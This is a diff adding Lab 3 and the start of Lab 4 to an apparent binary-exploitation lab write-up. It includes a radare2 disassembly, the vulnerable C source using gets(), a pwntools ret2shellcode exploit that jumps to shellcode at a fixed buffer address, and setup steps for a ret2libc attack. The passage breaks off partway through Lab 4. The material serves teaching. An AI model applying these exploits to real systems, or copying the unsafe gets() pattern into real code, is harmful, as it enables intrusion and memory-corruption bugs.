@@ -466,3 +466,87 @@ p.interactive()
 ```
 
 ## Lab 3
+```
+[0x080483d0]> pdf@sym.main
+            ;-- main:
+/ (fcn) sym.main 113
+|   sym.main ();
+|           ; var int local_4h @ esp+0x4
+|           ; var int local_8h @ esp+0x8
+|           ; var int local_ch @ esp+0xc
+|           ; var int local_1ch @ esp+0x1c
+|              ; DATA XREF from 0x080483e7 (entry0)
+|           0x080484cd      55             push ebp
+|           0x080484ce      89e5           mov ebp, esp
+|           0x080484d0      83e4f0         and esp, 0xfffffff0
+|           0x080484d3      83ec30         sub esp, 0x30               ; '0'
+|           0x080484d6      a140a00408     mov eax, dword obj.stdout   ; [0x804a040:4]=0x6e756275 ; "ubuntu1~14.04.3) 4.8.4" @ 0x804a040
+|           0x080484db      c744240c0000.  mov dword [local_ch], 0
+|           0x080484e3      c74424080200.  mov dword [local_8h], 2
+|           0x080484eb      c74424040000.  mov dword [local_4h], 0
+|           0x080484f3      890424         mov dword [esp], eax
+|           0x080484f6      e8c5feffff     call sym.imp.setvbuf       ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
+|           0x080484fb      c70424d08504.  mov dword [esp], str.Name:  ; [0x80485d0:4]=0x656d614e ; "Name:" @ 0x80485d0
+|           0x08048502      e879feffff     call sym.imp.printf        ; int printf(const char *format)
+|           0x08048507      c74424083200.  mov dword [local_8h], 0x32  ; '2' ; [0x32:4]=0x6001b ; '2'
+|           0x0804850f      c744240460a0.  mov dword [local_4h], obj.name ; [0x804a060:4]=0x2075746e ; "ntu 4.8.2-19ubuntu1) 4.8.2" @ 0x804a060
+|           0x08048517      c70424000000.  mov dword [esp], 0
+|           0x0804851e      e84dfeffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)
+|           0x08048523      c70424d68504.  mov dword [esp], str.Try_your_best: ; [0x80485d6:4]=0x20797254 ; "Try your best:" @ 0x80485d6
+|           0x0804852a      e851feffff     call sym.imp.printf        ; int printf(const char *format)
+|           0x0804852f      8d44241c       lea eax, dword [local_1ch]  ; 0x1c ; "4"
+|           0x08048533      890424         mov dword [esp], eax
+|           0x08048536      e855feffff     call sym.imp.gets          ; char*gets(char *s)
+|           0x0804853b      90             nop
+|           0x0804853c      c9             leave
+\           0x0804853d      c3             ret
+```
+It's a simple re2sc lab, we found buf address at `0x804a060`. because the overflow point is `0x1c (28)` bytes, plus `4` bytes of the ret address, we can generate a `32` bytes's strings.
+```
+from pwn import *
+
+p = process('./ret2sc')
+p.sendline(asm(shellcraft.linux.sh()))
+p.recv()
+p.sendline('A'*32+p32(0x0804a060))
+p.interactive()
+```
+Finally, the following is the source code:
+```
+#include <stdio.h>
+
+char name[50];
+
+int main(){
+	setvbuf(stdout,0,2,0);
+	printf("Name:");
+	read(0,name,50);
+	char buf[20];
+	printf("Try your best:");
+	gets(buf);
+	return ;
+}
+```
+
+## Lab 4
+```
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+```
+This time NX is enabled, so we can't execute shellcode in stack.
+```
+lab4$ sudo cat /proc/[pid]/maps
+ffb2f000-ffb50000 rw-p 00000000 00:00 0         [stack]
+```
+We know it call `libc.so`, and `libc.so` save a large number of available functions, we can let the program execute `system("/bin/sh")`. First copy `libc.so` here.
+```
+lab4$ ldd ret2lib
+	linux-gate.so.1 (0xf7fd7000)
+	libc.so.6 => /usr/lib32/libc.so.6 (0xf7dda000)
+	/lib/ld-linux.so.2 (0xf7fd9000)
+lab4$ cp /usr/lib32/libc.so.6 libc.so
+```
